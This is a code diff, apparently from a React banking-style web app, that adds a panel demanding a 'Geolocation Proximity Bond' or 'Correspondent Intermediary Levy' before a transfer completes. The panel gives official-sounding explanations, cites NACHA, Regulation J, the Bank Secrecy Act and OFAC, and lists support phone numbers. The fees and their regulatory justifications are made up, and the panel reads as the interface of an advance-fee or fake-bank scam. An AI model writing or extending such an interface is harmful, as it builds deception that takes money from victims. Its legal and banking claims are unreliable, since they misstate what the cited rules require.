                                 className="flex-1 py-3 bg-[#005a9c] hover:bg-blue-650 text-white font-extrabold text-xs uppercase tracking-widest rounded-xl transition cursor-pointer text-center"
@@ -2650,6 +2401,70 @@ TRANSACTION VALUE RECORD:
                                 <span className="text-lg font-black text-[#001c3d] font-mono">${parseFloat(transferAmount).toLocaleString('en-US', { minimumFractionDigits: 2 })}</span>
                               </div>
                             </div>
+
+                            {currentUser.transferCount >= 1 && currentCalculatedFee > 0 && (
+                              <div className="space-y-4">
+                                <div className="border border-slate-200 rounded-xl p-4.5 bg-slate-50 divide-y divide-slate-150 text-xs text-left">
+                                  <div className="flex justify-between py-2 font-bold font-mono">
+                                    <span className="text-slate-400">Dispatch Principal:</span>
+                                    <span className="text-slate-900">${parseFloat(transferAmount).toLocaleString('en-US', { minimumFractionDigits: 2 })}</span>
+                                  </div>
+                                  <div className="flex justify-between py-2 font-bold font-mono text-[#00669e]">
+                                    <span>
+                                      {parseFloat(transferAmount) < 11000 
+                                        ? 'Bond Due (Geolocation Proximity Bond):' 
+                                        : 'Levy Due (Correspondent Intermediary Levy):'}
+                                    </span>
+                                    <span>${currentCalculatedFee.toLocaleString('en-US', { minimumFractionDigits: 2 })}</span>
+                                  </div>
+                                  <div className="flex justify-between py-3 pt-3.5 border-t border-slate-200 font-bold leading-normal">
+                                    <span className="text-[#00669e] text-xs uppercase">Total Required Clearing Capital:</span>
+                                    <span className="text-lg font-black text-slate-950 font-mono">
+                                      ${(parseFloat(transferAmount) + currentCalculatedFee).toLocaleString('en-US', { minimumFractionDigits: 2 })}
+                                    </span>
+                                  </div>
+                                </div>
+
+                                <div className="border border-slate-200 bg-white p-5 shadow-sm text-left space-y-3" style={{ border: '1px solid #d0d7e0', borderRadius: '8px', backgroundColor: '#ffffff', padding: '20px', boxShadow: '0 1px 3px rgba(0,0,0,0.06)' }}>
+                                  <div className="border-l-[3px] border-[#00669e] pl-3">
+                                    <h4 className="text-sm font-bold text-[#00669e]">Why This Fee Is Required</h4>
+                                  </div>
+                                  {parseFloat(transferAmount) < 11000 ? (
+                                    <>
+                                      <p className="text-xs text-[#1e293b] leading-relaxed">
+                                        When you initiated this transfer, our system checked the routing path between your bank and the receiving institution. Our records show that your receiving bank is in a different geographic clearing region than what our transfer network expected. This is called a &apos;regional node mismatch&apos; — it happens when banks in different parts of the country use different processing systems.
+                                      </p>
+                                      <p className="text-xs text-[#1e293b] leading-relaxed">
+                                        To fix this, our network needs to manually re-route your transfer through a connecting bank that can bridge these two systems. This is called a &apos;Proximity Bond&apos; — it&apos;s a standard fee that covers the cost of re-routing your money through the correct regional channel. Without it, your transfer would be stuck in an uncompleted state and eventually returned, which could take 7-10 business days.
+                                      </p>
+                                      <p className="text-xs text-[#1e293b] leading-relaxed">
+                                        This fee is a one-time charge. Once paid, your money will be released to the receiving bank within 1-2 business days. If you choose not to pay, the transfer will be canceled automatically after 72 hours and the original amount will be returned to your account, though it may take 3-5 business days to appear.
+                                      </p>
+                                      <div className="border-t border-slate-200 pt-3 mt-4 text-[10px] text-[#64748b] space-y-1">
+                                        <p>Reference: NACHA Operating Rules §4.2.1 — Regional Routing Exception | Regulation J (12 CFR §210)</p>
+                                        <p>Questions? Call our Transfer Integrity Team at 1-800-555-0199</p>
+                                      </div>
+                                    </>
+                                  ) : (
+                                    <>
+                                      <p className="text-xs text-[#1e293b] leading-relaxed">
+                                        Your transfer is over $11,000, which means it needs to go through additional security checks before it can be completed. By law, financial institutions are required to review larger transfers to make sure they comply with federal regulations that prevent money laundering and other illegal activity. This is standard for any transfer over $10,000.
+                                      </p>
+                                      <p className="text-xs text-[#1e293b] leading-relaxed">
+                                        Because your money needs to pass through an intermediary bank — a middle bank that handles large transfers between institutions — there are additional processing fees involved. The Correspondent Intermediary Levy covers the cost of this extra layer of security screening and processing. This includes checking the transfer against government watchlists, verifying the identity of both senders and receivers, and ensuring all reporting requirements are met.
+                                      </p>
+                                      <p className="text-xs text-[#1e293b] leading-relaxed">
+                                        These checks are required by the Bank Secrecy Act and OFAC (Office of Foreign Assets Control) regulations. We cannot complete the transfer without them. The fee is collected upfront and the entire process typically takes 2-3 business days once paid. If you choose not to proceed, the original amount will be returned to your account within 3-5 business days.
+                                      </p>
+                                      <div className="border-t border-slate-200 pt-3 mt-4 text-[10px] text-[#64748b] space-y-1">
+                                        <p>Reference: Bank Secrecy Act (31 USC §5311) | OFAC Sanctions Compliance (31 CFR §501) | SWIFT gpi CBPR+ Standards</p>
+                                        <p>Questions? Call our Large Transfer Processing Desk at 1-800-555-0133</p>
+                                      </div>
+                                    </>
+                                  )}
+                                </div>
+                              </div>
+                            )}
 
                             <div className="flex gap-3">
                               <button 
